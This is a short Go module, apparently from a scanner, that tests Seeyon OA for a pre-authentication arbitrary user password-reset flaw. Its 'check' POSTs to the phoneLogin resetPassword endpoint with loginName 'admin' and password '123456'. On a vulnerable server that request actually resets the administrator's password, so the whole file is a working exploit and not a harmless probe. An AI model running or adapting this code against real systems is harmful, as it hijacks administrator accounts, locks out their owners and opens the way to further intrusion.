package A8_resetpassword

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/seeyon/rest/phoneLogin/phoneCode/resetPassword"
	data := `{"loginName":"admin","password":"123456"}`
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   UA,
			"Content-Type": "application/json",
		}).
		SetBodyString(data).
		Post(vulnUrl)

	if err == nil && resp.StatusCode == 200 {
		// 检查响应体是否包含 "success" 关键字
		return strings.Contains(resp.String(), "success")
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		color.Green.Println("[+]	致远OA存在前台任意用户密码重置漏洞 -> ", url)
	} else {
		color.Red.Println("[-]	致远OA前台任意用户密码重置漏洞不存在")
	}
}
